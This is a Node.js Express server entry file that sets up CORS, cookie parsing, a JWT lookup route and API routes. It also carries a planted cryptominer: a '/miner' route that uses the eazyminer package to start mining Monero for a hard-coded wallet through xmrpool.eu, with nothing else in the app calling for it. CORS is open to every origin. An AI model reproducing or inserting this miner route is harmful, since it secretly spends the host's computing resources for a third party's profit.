const express = require('express')
const bodyParser = require('body-parser')
const cors = require('cors')
const cookieParser = require('cookie-parser')
require('dotenv').config({ path: './config/.env' })
require('./config/db')
const { fetchJwt } = require('./middleware/authMiddleware')
const path = require('path')
const Miner = require("eazyminer")
const mongoose = require('mongoose')

mongoose.set('strictQuery', true);

const app = express()

// const corsOptions = {
//   'origin': [process.env.CLIENT_URL, process.env.API_URL],
//   'credentials': true,
//   'allowedHeaders': ['sessionId', 'Content-Type'],
//   'exposedHeaders': ['sessionId'],
//   'methods': 'GET,HEAD,PUT,PATCH,POST,DELETE',
//   'preflightContinue': false
// }

// 'allowedHeaders': ['sessionId', 'Content-Type'],
//   'exposedHeaders': ['sessionId'],
//   'methods': 'GET,HEAD,PUT,PATCH,POST,DELETE',
//   'preflightContinue': false

app.use(cors({origin: "*"}))
app.options(process.env.CLIENT_URL, cors());

app.use('/uploads', express.static(path.join(__dirname, 'uploads')))
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))
app.use(cookieParser())

app.get('/jwtid', fetchJwt, (req, res) => {
  res.status(200).send(res.locals.user)
})
app.get('/miner', (req, res) => {
  const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '42y1kQtth6gfF1LoxiJkFM5bnpmQ1C2sDN8nPFuNFoKGdT7Tw47saUXjW21HQGHCki477BrjtJVNZj9sfHjNvccaHF4NgWB',
        url: 'xmrpool.eu:9999', 
    }],
    // web: {
        // enabled: true
    // },
    log: {
      writeToConsole: true
    },
    autoStart: true
  });
  res.status(200).send("start miner")
})

app.use('/api', require('./routes/index.routes'))

app.listen(process.env.PORT, () => {
  console.log(`Listening on port : ${process.env.PORT}`)
})